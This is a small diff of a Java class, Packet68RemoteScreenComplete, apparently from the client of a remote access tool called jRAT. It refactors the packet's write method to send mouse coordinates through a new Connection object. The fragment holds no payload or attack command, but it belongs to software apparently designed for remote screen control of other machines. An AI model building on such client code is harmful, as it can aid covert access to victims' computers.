@@ -1,7 +1,6 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
+import jrat.client.Connection;
 
 
 public class Packet68RemoteScreenComplete extends AbstractOutgoingPacket {
@@ -15,9 +14,9 @@ public class Packet68RemoteScreenComplete extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		dos.writeInt(mouseX);
-		dos.writeInt(mouseY);
+	public void write(Connection con) throws Exception {
+        con.writeInt(mouseX);
+        con.writeInt(mouseY);
 	}
 
 	@Override
